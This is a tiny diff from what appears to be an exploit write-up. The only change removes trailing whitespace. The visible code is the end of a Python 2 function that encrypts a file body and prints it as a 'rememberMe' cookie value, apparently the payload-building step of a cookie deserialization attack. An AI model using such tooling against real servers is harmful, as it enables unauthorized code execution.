@@ -72,7 +72,7 @@ def encode_rememberme(command):
      base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
      return base64_ciphertext
 if __name__ == '__main__':
-     payload = encode_rememberme(sys.argv[1])  
+     payload = encode_rememberme(sys.argv[1])
 print "rememberMe={0}".format(payload.decode())
 
 ```
